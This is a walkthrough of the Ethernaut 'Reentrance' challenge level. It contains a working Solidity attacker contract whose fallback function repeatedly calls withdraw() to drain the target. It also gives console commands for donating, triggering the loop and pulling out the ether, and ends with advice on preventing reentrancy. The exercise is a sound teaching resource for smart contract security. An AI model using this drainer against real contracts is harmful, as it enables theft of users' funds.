# 10. Reentrance
The goal of this level is for you to steal all the funds from the contract.

Reading:  
https://quantstamp.com/blog/what-is-a-re-entrancy-attack
Steps.

Proxy.sol
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IReentrance {
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns (uint balance);
    function withdraw(uint _amount) external;
}

contract Proxy {
    
    address payable public owner;
    address public reentranceAddress = 0xB4155770b77B7c24a90Af98246Df03F909E6294A;
    
    constructor() public {
        owner = msg.sender;
    }
    
    function callWithdrawBalance() public {
        IReentrance(reentranceAddress).withdraw(0.1 ether);
    }
    
	// this is where the reentrancy loop happens
    receive () external payable { 
        if (reentranceAddress.balance > 0 ether) {
            callWithdrawBalance();
        }
    }
    
    function drain() public {
        owner.transfer(address(this).balance);
    }
}
```

- deploy Proxy contract 
	get deployed contract 'Proxy.sol' address
- call donate(_to) from console where _to = 'Proxy.sol' address
	`contract.donate("0x0759616d11dDaFe810e0F3fF96BF95DC498Da6d4",{from:"[player address]", value:100000000000000000})`

- call Proxy.callWithdrawBalance()

- (optional) call Proxy.drain() to get back eth

- confirm with `getBalance(contract.address)`
		
**END**

Level completed!

Difficulty 6/10

In order to prevent re-entrancy attacks when moving funds out of your contract, use the Checks-Effects-Interactions pattern being aware that call will only return false without interrupting the execution flow. Solutions such as ReentrancyGuard or PullPayment can also be used.

transfer and send are no longer recommended solutions as they can potentially break contracts after the Istanbul hard fork Source 1 Source 2.

Always assume that the receiver of the funds you are sending can be another contract, not just a regular address. Hence, it can execute code in its payable fallback method and re-enter your contract, possibly messing up your state/logic.

Re-entrancy is a common attack. You should always be prepared for it!

The DAO Hack

The famous DAO hack used reentrancy to extract a huge amount of ether from the victim contract. See 15 lines of code that could have prevented TheDAO Hack.